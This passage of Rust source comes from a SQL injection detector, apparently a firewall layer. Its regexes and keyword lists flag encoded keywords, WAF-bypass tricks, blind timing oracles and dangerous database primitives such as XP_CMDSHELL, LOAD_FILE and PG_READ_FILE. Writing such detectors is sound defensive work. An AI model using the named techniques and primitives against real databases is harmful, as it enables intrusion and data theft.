            let Some(hex) = tok_val
                .strip_prefix("0x")
                .or_else(|| tok_val.strip_prefix("0X"))
            else {
                continue;
            };
            if hex.len() < 4 || hex.len() % 2 != 0 || !hex.chars().all(|c| c.is_ascii_hexdigit()) {
                continue;
            }

            let mut decoded = String::new();
            let mut printable = true;
            for i in (0..hex.len()).step_by(2) {
                let Ok(byte) = u8::from_str_radix(&hex[i..i + 2], 16) else {
                    printable = false;
                    break;
                };
                let ch = byte as char;
                if ch.is_ascii_graphic() || ch == ' ' || ch == '_' {
                    decoded.push(ch);
                } else {
                    printable = false;
                    break;
                }
            }
            if !printable || decoded.len() < 4 {
                continue;
            }

            let decoded_upper = decoded.to_uppercase();
            if ["UNION", "SELECT", "DROP", "SLEEP", "WAITFOR", "XP_CMDSHELL"]
                .iter()
                .any(|kw| decoded_upper.contains(kw))
            {
                detections.push(L2Detection {
                    detection_type: "hex_keyword_encoding".into(),
                    confidence: 0.90,
                    detail: format!("Hex SQL literal decodes to keyword-bearing payload text: {}", decoded),
                    position: *tok_pos,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::EncodingDecode,
                        matched_input: tok_val.clone(),
                        interpretation: format!("Hex literal decodes to SQL payload fragment: {}", decoded),
                        offset: *tok_pos,
                        property: "User input must not smuggle executable SQL keywords through encoded literals".into(),
                    }],
                });
            }
        }

        detections
    }

    fn detect_backtick_tautology(&self, input: &str, tokens: &[TokTuple]) -> Vec<L2Detection> {
        let mut detections = Vec::new();
        if !input.contains('`') {
            return detections;
        }

        let meaningful: Vec<_> = tokens
            .iter()
            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
            .collect();

        for i in 0..meaningful.len().saturating_sub(3) {
            let (tok_type, tok_val, tok_pos) = meaningful[i];
            if *tok_type != SqlTokenType::BooleanOp
                || !(tok_val.eq_ignore_ascii_case("OR") || tok_val.eq_ignore_ascii_case("AND"))
            {
                continue;
            }
            if meaningful[i + 1].0 != SqlTokenType::Number
                || meaningful[i + 2].0 != SqlTokenType::Operator
                || meaningful[i + 3].0 != SqlTokenType::Number
            {
                continue;
            }
            if meaningful[i + 2].1 != "=" {
                continue;
            }
            if meaningful[i + 1].1 == meaningful[i + 3].1 {
                detections.push(L2Detection {
                    detection_type: "backtick_tautology".into(),
                    confidence: 0.89,
                    detail: "Backtick-quoted identifier query contains classic boolean tautology predicate".into(),
                    position: *tok_pos,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: extract_context(input, *tok_pos, 48),
                        interpretation: "Input uses MySQL backtick identifier context and appends an always-true predicate".into(),
                        offset: *tok_pos,
                        property: "Boolean evaluation of SQL conditional expression must not be unconditional TRUE".into(),
                    }],
                });
                break;
            }
        }

        detections
    }

    fn detect_dollar_quoted_stacked(&self, input: &str) -> Vec<L2Detection> {
        static DOLLAR_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"\$\$|\$[A-Za-z_][A-Za-z0-9_]*\$").unwrap());

        let mut detections = Vec::new();
        let mut markers = Vec::new();
        for m in DOLLAR_RE.find_iter(input) {
            markers.push((m.as_str().to_owned(), m.start(), m.end()));
        }
        if markers.len() < 2 {
            return detections;
        }

        for i in 0..markers.len().saturating_sub(1) {
            for j in (i + 1)..markers.len() {
                if markers[i].0 != markers[j].0 {
                    continue;
                }
                let inner = &input[markers[i].2..markers[j].1];
                let inner_upper = inner.to_uppercase();
                let has_stacked = STATEMENT_STARTERS
                    .iter()
                    .any(|kw| inner_upper.contains(&format!("; {}", kw)));
                if has_stacked {
                    detections.push(L2Detection {
                        detection_type: "dollar_quote_stacked".into(),
                        confidence: 0.90,
                        detail: "PostgreSQL dollar-quoted payload carries stacked SQL statement".into(),
                        position: markers[i].1,
                        evidence: vec![ProofEvidence {
                            operation: EvidenceOperation::ContextEscape,
                            matched_input: input[markers[i].1..markers[j].2].to_owned(),
                            interpretation: "Input uses dollar-quoted string syntax to hide stacked SQL execution".into(),
                            offset: markers[i].1,
                            property: "SQL statement boundary must remain single-statement unless explicitly intended".into(),
                        }],
                    });
                    return detections;
                }
            }
        }

        detections
    }

    fn detect_mssql_bracket_exfiltration(&self, input: &str) -> Vec<L2Detection> {
        static BRACKET_PATH_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\[[A-Za-z0-9_]+\]\s*\.\s*\.\s*\[[A-Za-z0-9_]+\]").unwrap()
        });

        let mut detections = Vec::new();
        let upper = input.to_uppercase();
        if !(upper.contains("[MASTER]")
            || upper.contains("[MSDB]")
            || upper.contains("[TEMPDB]")
            || upper.contains("[SYSOBJECTS]"))
        {
            return detections;
        }

        for m in BRACKET_PATH_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "mssql_bracket_exfiltration".into(),
                confidence: 0.88,
                detail: "MSSQL bracket-qualified cross-database object path detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input references system database objects via bracket-escaped multipart identifiers".into(),
                    offset: m.start(),
                    property: "User input must not introduce system catalog enumeration paths in SQL queries".into(),
                }],
            });
        }
        detections
    }

    fn detect_mysql_versioned_comment_payload(&self, input: &str) -> Vec<L2Detection> {
        static MYSQL_VER_COMMENT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)/\*!\d{3,5}\s*(?:UNION|SELECT|DROP|INSERT|UPDATE|DELETE|SLEEP|BENCHMARK|WAITFOR)\b.*?\*/").unwrap()
        });
        static MYSQL_VER_WILDCARD_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)/\*!\d{5}(?:SELECT|UNION|WHERE|HAVING)\b.*?\*/").unwrap()
        });

        let mut detections = Vec::new();
        for m in MYSQL_VER_COMMENT_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "mysql_versioned_comment".into(),
                confidence: 0.92,
                detail: "MySQL version-conditional comment contains executable SQL keyword payload".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SyntaxRepair,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input hides executable SQL inside MySQL /*!...*/ conditional comment syntax".into(),
                    offset: m.start(),
                    property: "Injected SQL payloads must not introduce hidden executable query paths".into(),
                }],
            });
        }
        for m in MYSQL_VER_WILDCARD_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "mysql_versioned_comment".into(),
                confidence: 0.87,
                detail: "MySQL 5-digit version wildcard bypass".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SyntaxRepair,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "Input attempts to evade WAF rules with no-space 5-digit versioned comments"
                            .into(),
                    offset: m.start(),
                    property:
                        "Injected SQL payloads must not introduce hidden executable query paths"
                            .into(),
                }],
            });
        }
        detections
    }

    fn detect_order_by_time_oracle(&self, input: &str) -> Vec<L2Detection> {
        static ORDER_BY_BLIND_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\border\s+by\b[^;]*,\s*\(\s*select\b[^;]*(?:sleep|pg_sleep|benchmark|waitfor)\b").unwrap()
        });

        let mut detections = Vec::new();
        for m in ORDER_BY_BLIND_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "order_by_time_oracle".into(),
                confidence: 0.92,
                detail: "ORDER BY blind-injection subquery with timing primitive".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: extract_context(input, m.start(), 96),
                    interpretation: "Input injects ORDER BY subquery used for blind timing inference".into(),
                    offset: m.start(),
                    property: "Execution time of SQL evaluation must remain independent of attacker-controlled timing".into(),
                }],
            });
        }
        detections
    }

    fn detect_window_exfiltration(&self, input: &str) -> Vec<L2Detection> {
        static WINDOW_EXFIL_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\b(?:ROW_NUMBER|RANK|DENSE_RANK)\s*\(\s*\)\s*OVER\s*\(\s*ORDER\s+BY\s+([A-Za-z0-9_\.]+)").unwrap()
        });

        let mut detections = Vec::new();
        for caps in WINDOW_EXFIL_RE.captures_iter(input) {
            let Some(full) = caps.get(0) else { continue };
            let Some(order_col) = caps.get(1) else {
                continue;
            };
            let upper_col = order_col.as_str().to_uppercase();
            if !SQL_SENSITIVE_FIELDS
                .iter()
                .any(|field| upper_col.contains(field))
            {
                continue;
            }

            detections.push(L2Detection {
                detection_type: "window_exfiltration".into(),
                confidence: 0.87,
                detail: format!("Window function orders over sensitive field: {}", order_col.as_str()),
                position: full.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: full.as_str().to_owned(),
                    interpretation: "Input introduces window-function ordering that can enumerate sensitive values".into(),
                    offset: full.start(),
                    property: "User input must not introduce sensitive-data extraction paths in SQL queries".into(),
                }],
            });
        }
        detections
    }

    fn detect_json_extraction_abuse(&self, input: &str) -> Vec<L2Detection> {
        static JSON_FN_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\b(?:JSON_EXTRACT|JSON_VALUE|JSON_QUERY|OPENJSON|JSONB_EXTRACT_PATH_TEXT)\s*\([^)]*(?:password|passwd|secret|token|api_key)").unwrap()
        });
        static JSON_OP_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\b[A-Za-z_][A-Za-z0-9_]*\s*->>?\s*'?(?:password|passwd|secret|token|api_key)'?").unwrap()
        });

        let mut detections = Vec::new();
        for m in JSON_FN_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "json_extraction".into(),
                confidence: 0.86,
                detail: "JSON extraction function targets sensitive key names".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input introduces JSON path extraction for sensitive fields".into(),
                    offset: m.start(),
                    property: "User input must not introduce sensitive-data extraction paths in SQL queries".into(),
                }],
            });
        }
        for m in JSON_OP_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "json_extraction".into(),
                confidence: 0.86,
                detail: "JSON arrow operator extracts sensitive key names".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input uses JSON traversal operators to extract sensitive data".into(),
                    offset: m.start(),
                    property: "User input must not introduce sensitive-data extraction paths in SQL queries".into(),
                }],
            });
        }
        detections
    }
    fn detect_order_by_injection(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
        let mut detections = Vec::new();
        let meaningful: Vec<_> = tokens
            .iter()
            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
            .collect();
        for i in 0..meaningful.len().saturating_sub(2) {
            let (tok_type, tok_val, tok_pos) = meaningful[i];
            if *tok_type == SqlTokenType::Keyword
                && tok_val.eq_ignore_ascii_case("ORDER")
                && meaningful[i + 1].1.eq_ignore_ascii_case("BY")
            {
                let next = meaningful[i + 2];
                if next.0 == SqlTokenType::Number {
                    detections.push(L2Detection {
                        detection_type: "order_by_injection".into(),
                        confidence: 0.85,
                        detail: format!(
                            "ORDER BY numeric position (column enumeration): ORDER BY {}",
                            next.1
                        ),
                        position: *tok_pos,
                        evidence: vec![ProofEvidence {
                            operation: EvidenceOperation::PayloadInject,
                            matched_input: format!("ORDER BY {}", next.1),
                            interpretation:
                                "Input uses ORDER BY numeric index to infer column count".into(),
                            offset: *tok_pos,
                            property: "Column count must not be enumerable via ordinal ORDER BY"
                                .into(),
                        }],
                    });
                } else if next.1.eq_ignore_ascii_case("IF")
                    || next.1.eq_ignore_ascii_case("CASE")
                    || (next.0 == SqlTokenType::Identifier
                        && TIME_DELAY_FUNCTIONS.contains(&next.1.to_uppercase().as_str()))
                {
                    detections.push(L2Detection {
                        detection_type: "order_by_injection".into(),
                        confidence: 0.95,
                        detail: "ORDER BY clause contains conditional logic or timing primitive"
                            .into(),
                        position: *tok_pos,
                        evidence: vec![ProofEvidence {
                            operation: EvidenceOperation::PayloadInject,
                            matched_input: format!("ORDER BY {}", next.1),
                            interpretation:
                                "Input injects logic into ORDER BY for boolean/time inference"
                                    .into(),
                            offset: *tok_pos,
                            property:
                                "ORDER BY clauses must not contain attacker-controlled expressions"
                                    .into(),
                        }],
                    });
                } else if next.0 == SqlTokenType::ParenOpen
                    && i + 3 < meaningful.len()
                    && meaningful[i + 3].1.eq_ignore_ascii_case("SELECT")
                {
                    detections.push(L2Detection {
                        detection_type: "order_by_injection".into(),
                        confidence: 0.95,
                        detail: "ORDER BY clause contains subquery".into(),
                        position: *tok_pos,
                        evidence: vec![ProofEvidence {
                            operation: EvidenceOperation::PayloadInject,
                            matched_input: "ORDER BY (SELECT ...".into(),
                            interpretation: "Input injects a subquery into ORDER BY".into(),
                            offset: *tok_pos,
                            property:
                                "ORDER BY clauses must not contain attacker-controlled subqueries"
                                    .into(),
                        }],
                    });
                }
            }
        }
        detections
    }

    fn detect_having_injection(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
        let mut detections = Vec::new();
        let meaningful: Vec<_> = tokens
            .iter()
            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
            .collect();
        for i in 0..meaningful.len().saturating_sub(2) {
            let (tok_type, tok_val, tok_pos) = meaningful[i];
            if *tok_type == SqlTokenType::Keyword && tok_val.eq_ignore_ascii_case("HAVING") {
                let next1 = meaningful[i + 1];
                if next1.1 == "1" || next1.0 == SqlTokenType::Number {
                    if i + 3 < meaningful.len()
                        && meaningful[i + 2].1 == "="
                        && meaningful[i + 3].0 == SqlTokenType::Number
                    {
                        detections.push(L2Detection {
                            detection_type: "having_injection".into(),
                            confidence: 0.90,
                            detail: "HAVING clause tautology detected".into(),
                            position: *tok_pos,
                            evidence: vec![ProofEvidence {
                                operation: EvidenceOperation::PayloadInject,
                                matched_input: format!("HAVING {}={}", next1.1, meaningful[i+3].1),
                                interpretation: "Input forces an always-true evaluation in HAVING clause".into(),
                                offset: *tok_pos,
                                property: "HAVING clauses must not be unconditionally true".into(),
                            }],
                        });
                    }
                }
            }
        }
        detections
    }

    fn detect_group_by_injection(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
        let mut detections = Vec::new();
        let meaningful: Vec<_> = tokens
            .iter()
            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
            .collect();
        for i in 0..meaningful.len().saturating_sub(2) {
            let (tok_type, tok_val, tok_pos) = meaningful[i];
            if *tok_type == SqlTokenType::Keyword
                && tok_val.eq_ignore_ascii_case("GROUP")
                && meaningful[i + 1].1.eq_ignore_ascii_case("BY")
            {
                let next = meaningful[i + 2];
                if next.0 == SqlTokenType::Number {
                    detections.push(L2Detection {
                        detection_type: "group_by_injection".into(),
                        confidence: 0.85,
                        detail: format!(
                            "GROUP BY numeric position (column enumeration): GROUP BY {}",
                            next.1
                        ),
                        position: *tok_pos,
                        evidence: vec![ProofEvidence {
                            operation: EvidenceOperation::PayloadInject,
                            matched_input: format!("GROUP BY {}", next.1),
                            interpretation:
                                "Input uses GROUP BY numeric index to infer column count".into(),
                            offset: *tok_pos,
                            property: "Column count must not be enumerable via ordinal GROUP BY"
                                .into(),
                        }],
                    });
                }
            }
        }
        detections
    }

    fn detect_subquery_injection(&self, input: &str) -> Vec<L2Detection> {
        static SUBQUERY_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\(\s*SELECT\s+(?:(?:\*|MAX|MIN|COUNT|SUM|AVG)\s*\(.*?\)|[A-Za-z0-9_,\.\s]+)\s+FROM\s+[A-Za-z0-9_]+\s*(?:WHERE|GROUP|HAVING|ORDER|LIMIT)?.*?\)").unwrap()
        });

        let mut detections = Vec::new();
        for m in SUBQUERY_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "subquery_injection".into(),
                confidence: 0.88,
                detail: "Embedded SELECT subquery indicates data exfiltration or inference".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: extract_context(input, m.start(), 64),
                    interpretation: "Input uses a subquery to exfiltrate or test unauthorized data"
                        .into(),
                    offset: m.start(),
                    property: "User input must not execute unauthorized SELECT subqueries".into(),
                }],
            });
        }
        detections
    }

    fn detect_second_order_injection(&self, input: &str) -> Vec<L2Detection> {
        static SECOND_ORDER_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)(?:'\|\||\+\s*')\s*\(\s*SELECT\b").unwrap()
        });
        let mut detections = Vec::new();
        for m in SECOND_ORDER_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "second_order_injection".into(),
                confidence: 0.95,
                detail: "Second-order SQL injection payload (concatenated subquery)".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: extract_context(input, m.start(), 32),
                    interpretation: "Input stores a concatenated subquery for later execution"
                        .into(),
                    offset: m.start(),
                    property: "Input must not store delayed-execution SQL payloads".into(),
                }],
            });
        }
        detections
    }

    fn detect_xml_abuse(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
        let mut detections = Vec::new();
        let xml_functions = ["XMLTYPE", "UPDATEXML", "EXTRACTVALUE", "DBMS_XMLGEN"];
        for (tok_type, tok_val, tok_pos) in tokens {
            if matches!(tok_type, SqlTokenType::Identifier | SqlTokenType::Keyword) {
                let val_upper = tok_val.to_uppercase();
                if xml_functions.contains(&val_upper.as_str()) {
                    detections.push(L2Detection {
                        detection_type: "xml_abuse".into(),
                        confidence: 0.91,
                        detail: format!("XML processing function abuse: {}", tok_val),
                        position: *tok_pos,
                        evidence: vec![ProofEvidence {
                            operation: EvidenceOperation::PayloadInject,
                            matched_input: tok_val.clone(),
                            interpretation: "Input abuses XML parsing functions to exfiltrate data via errors or out-of-band requests".into(),
                            offset: *tok_pos,
                            property: "User input must not invoke dangerous XML processing functions".into(),
                        }],
                    });
                }
            }
        }
        detections
    }

    fn detect_cte_injection(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
        let mut detections = Vec::new();
        let meaningful: Vec<_> = tokens
            .iter()
            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
            .collect();
        for i in 0..meaningful.len().saturating_sub(3) {
            let (tok_type, tok_val, tok_pos) = meaningful[i];
            if matches!(tok_type, SqlTokenType::Keyword | SqlTokenType::Identifier)
                && tok_val.eq_ignore_ascii_case("WITH")
            {
                if matches!(
                    meaningful[i + 2].0,
                    SqlTokenType::Keyword | SqlTokenType::Identifier
                ) && meaningful[i + 2].1.eq_ignore_ascii_case("AS")
                    && meaningful[i + 3].0 == SqlTokenType::ParenOpen
                {
                    detections.push(L2Detection {
                        detection_type: "cte_injection".into(),
                        confidence: 0.92,
                        detail: "Common Table Expression (WITH CTE) injection".into(),
                        position: *tok_pos,
                        evidence: vec![ProofEvidence {
                            operation: EvidenceOperation::PayloadInject,
                            matched_input: "WITH ... AS (".into(),
                            interpretation: "Input constructs a Common Table Expression to alter query structure".into(),
                            offset: *tok_pos,
                            property: "Query structure must not be altered via injected CTEs".into(),
                        }],
                    });
                }
            }
        }
        detections
    }

    fn detect_db_specific_primitives(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
        let db_primitives = [
            "LO_IMPORT",
            "LO_EXPORT",
            "PG_READ_FILE",
            "PG_READ_BINARY_FILE",
            "PG_LS_DIR",
            "LOAD_FILE",
            "XP_CMDSHELL",
            "SP_OACREATE",
            "OPENROWSET",
            "OPENDATASOURCE",
            "UTL_HTTP.REQUEST",
            "DBMS_PIPE.RECEIVE_MESSAGE",
            "SYS.DBMS_EXPORT",
            "LOAD_EXTENSION",
        ];

        let mut detections = Vec::new();
        for (tok_type, tok_val, tok_pos) in tokens {
            if matches!(tok_type, SqlTokenType::Identifier | SqlTokenType::Keyword) {
                let val_upper = tok_val.to_uppercase();
                if db_primitives.iter().any(|&p| val_upper.contains(p)) {
                    detections.push(L2Detection {
                        detection_type: "db_specific_primitive".into(),
                        confidence: 0.95,
                        detail: format!("Database-specific execution primitive: {}", val_upper),
                        position: *tok_pos,
                        evidence: vec![ProofEvidence {
                            operation: EvidenceOperation::PayloadInject,
                            matched_input: tok_val.clone(),
                            interpretation:
                                "Input invokes highly privileged database execution primitives"
                                    .into(),
                            offset: *tok_pos,
                            property: "User input must not access dangerous DB-specific primitives"
                                .into(),
                        }],
                    });
                }
            }
        }

        let meaningful: Vec<_> = tokens
            .iter()
            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
            .collect();
        for i in 0..meaningful.len().saturating_sub(1) {
            let val1 = meaningful[i].1.to_uppercase();
            let val2 = meaningful[i + 1].1.to_uppercase();
            if val1 == "ATTACH" && val2 == "DATABASE" {
                detections.push(L2Detection {
                    detection_type: "db_specific_primitive".into(),
                    confidence: 0.95,
                    detail: "SQLite ATTACH DATABASE primitive".into(),
                    position: meaningful[i].2,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: "ATTACH DATABASE".into(),
                        interpretation: "Input attempts to attach an external SQLite database"
                            .into(),
                        offset: meaningful[i].2,
                        property: "User input must not attach external databases".into(),
                    }],
                });
            }
            if val1 == "LOAD"
                && val2 == "DATA"
                && i + 2 < meaningful.len()
                && meaningful[i + 2].1.to_uppercase() == "INFILE"
            {
                detections.push(L2Detection {
                    detection_type: "db_specific_primitive".into(),
                    confidence: 0.95,
                    detail: "MySQL LOAD DATA INFILE primitive".into(),
                    position: meaningful[i].2,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: "LOAD DATA INFILE".into(),
                        interpretation: "Input uses LOAD DATA INFILE to read arbitrary files"
                            .into(),
                        offset: meaningful[i].2,
                        property: "User input must not access dangerous file read primitives"
                            .into(),
                    }],
                });
            }
        }

        detections
    }

    fn detect_waf_bypass_alternative_whitespace(&self, input: &str) -> Vec<L2Detection> {
        let mut detections = Vec::new();
        if input.contains('\x0B') || input.contains('\x0C') || input.contains('\t') {
            static ALT_WS_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
                Regex::new(r"(?is)(?:UNION|SELECT|INSERT|UPDATE|DELETE|DROP|AND|OR)[\x0B\x0C\t]+(?:UNION|SELECT|INSERT|UPDATE|DELETE|DROP|AND|OR|\d)").unwrap()
            });
            for m in ALT_WS_RE.find_iter(input) {
                detections.push(L2Detection {
                    detection_type: "alt_whitespace_bypass".into(),
                    confidence: 0.89,
                    detail: "Alternative whitespace (VT/FF/TAB) used to bypass WAF tokenization".into(),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::EncodingDecode,
                        matched_input: m.as_str().to_owned(),
                        interpretation: "Input uses non-standard whitespace to separate SQL keywords".into(),
                        offset: m.start(),
                        property: "SQL queries must not be obfuscated with alternative whitespace characters".into(),
                    }],
                });
            }
        }
        detections
    }

    fn detect_postgres_escape_string_keywords(&self, input: &str) -> Vec<L2Detection> {
        static PG_ESCAPE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"E'(?:\\x[0-9a-fA-F]{2}|\\u[0-9a-fA-F]{4}|\\[0-9]{3})+'"#).unwrap()
        });
        const SUSPICIOUS: &[&str] = &[
            "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "EXEC", "EXECUTE", "XP_",
            "SP_",
        ];

        let mut detections = Vec::new();
        for m in PG_ESCAPE_RE.find_iter(input) {
            let full = m.as_str();
            let inner = &full[2..full.len() - 1];
            let bytes = inner.as_bytes();
            let mut i = 0usize;
            let mut decoded = String::new();

            while i < bytes.len() {
                if bytes[i] != b'\\' || i + 1 >= bytes.len() {
                    i += 1;
                    continue;
                }
                match bytes[i + 1] as char {
                    'x' | 'X' if i + 3 < bytes.len() => {
                        let hex = &inner[i + 2..i + 4];
                        if let Ok(v) = u8::from_str_radix(hex, 16) {
                            decoded.push(v as char);
                        }
                        i += 4;
                    }
                    'u' | 'U' if i + 5 < bytes.len() => {
                        let hex = &inner[i + 2..i + 6];
                        if let Ok(v) = u32::from_str_radix(hex, 16)
                            && let Some(ch) = char::from_u32(v)
                        {
                            decoded.push(ch);
                        }
                        i += 6;
                    }
                    d if d.is_ascii_digit() && i + 3 < bytes.len() => {
                        let oct = &inner[i + 1..i + 4];
                        if let Ok(v) = u8::from_str_radix(oct, 8) {
                            decoded.push(v as char);
                        }
                        i += 4;
                    }
                    _ => i += 2,
                }
            }

            let decoded_upper = decoded.to_uppercase();
            if SUSPICIOUS.iter().any(|kw| decoded_upper.contains(kw)) {
                detections.push(L2Detection {
                    detection_type: "postgres_escape_keyword".into(),
                    confidence: 0.88,
                    detail: format!(
                        "PostgreSQL E'' escaped string decodes to SQL keyword-bearing text: {}",
                        decoded
                    ),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::EncodingDecode,
                        matched_input: full.to_owned(),
                        interpretation: format!(
                            "PostgreSQL escape string decoding reveals SQL payload text: {}",
                            decoded
                        ),
                        offset: m.start(),
                        property: "User input must not smuggle executable SQL keywords through escaped string literals".into(),
                    }],
                });
            }
        }
        detections
    }

    fn detect_mysql_binary_literal_identifiers(&self, input: &str) -> Vec<L2Detection> {
        static MYSQL_BINARY_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"\b0b[01]{8,}\b").unwrap());
        const SUSPICIOUS: &[&str] = &[
            "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "EXEC", "EXECUTE", "XP_",
            "SP_",
        ];

        let mut detections = Vec::new();
        for m in MYSQL_BINARY_RE.find_iter(input) {
            let bits = &m.as_str()[2..];
            let mut decoded = String::new();
            for chunk in bits.as_bytes().chunks(8) {
                if chunk.len() != 8 {
                    break;
                }
                let Ok(bit_str) = std::str::from_utf8(chunk) else {
                    continue;
                };
                if let Ok(v) = u8::from_str_radix(bit_str, 2) {
                    let ch = v as char;
                    if ch.is_ascii_graphic() || ch == ' ' || ch == '_' {
                        decoded.push(ch);
                    }
                }
            }

            let decoded_upper = decoded.to_uppercase();
            let detail = if SUSPICIOUS.iter().any(|kw| decoded_upper.contains(kw)) {
                format!(
                    "MySQL binary literal decodes to SQL keyword-bearing text: {}",
                    decoded
                )
            } else {
                "MySQL binary literal (0b...) used in SQL payload context".into()
            };

            detections.push(L2Detection {
                detection_type: "mysql_binary_literal".into(),
                confidence: 0.75,
                detail,
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::EncodingDecode,
                    matched_input: m.as_str().to_owned(),
                    interpretation: if decoded.is_empty() {
                        "Input uses MySQL binary numeric syntax that can encode SQL character codes".into()
                    } else {
                        format!("Binary literal decodes to: {}", decoded)
                    },
                    offset: m.start(),
                    property: "User input must not construct executable SQL keywords through binary literals".into(),
                }],
            });
        }
        detections
    }

    fn detect_oracle_q_quote_keyword_strings(&self, input: &str) -> Vec<L2Detection> {
        static ORACLE_Q_QUOTE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)\bq'[\[{(<][^']*(?:union|select|insert|update|delete|drop|exec|execute|xp_)[^']*[\]}>)]").unwrap()
        });

        let mut detections = Vec::new();
        for m in ORACLE_Q_QUOTE_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "oracle_q_quote_keyword".into(),
                confidence: 0.89,
                detail: "Oracle q-quoted alternative string contains SQL keyword payload".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SyntaxRepair,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input uses Oracle q-quoted delimiters to carry SQL keywords while bypassing quote filters".into(),
                    offset: m.start(),
                    property: "User input must not hide executable SQL keywords in alternative quoted literals".into(),
                }],
            });
        }
        detections
    }

    fn detect_mssql_bracketed_identifier_abuse(&self, input: &str) -> Vec<L2Detection> {
        static MSSQL_BRACKET_ID_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)\[(?:select|union|insert|update|delete|exec|execute|xp_\w+|sp_\w+)\]")
                .unwrap()
        });

        let mut detections = Vec::new();
        for m in MSSQL_BRACKET_ID_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "mssql_bracket_identifier_abuse".into(),
                confidence: 0.87,
                detail: "SQL Server bracketed identifier wraps executable keyword/procedure name".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SyntaxRepair,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input abuses MSSQL [identifier] escaping around SQL keywords or dangerous procedures".into(),
                    offset: m.start(),
                    property: "User input must not introduce executable SQL keywords through bracketed identifier abuse".into(),
                }],
            });
        }
        detections
    }

    fn detect_mysql_pipe_concatenation_bypass(&self, input: &str) -> Vec<L2Detection> {
        static MYSQL_PIPE_CONCAT_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"'[a-z]'\s*\|\|\s*'[a-z]'").unwrap());

        let mut detections = Vec::new();
        for m in MYSQL_PIPE_CONCAT_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "mysql_pipe_concat_bypass".into(),
                confidence: 0.72,
                detail: "MySQL pipe concatenation of single-character strings detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SyntaxRepair,
                    matched_input: m.as_str().to_owned(),
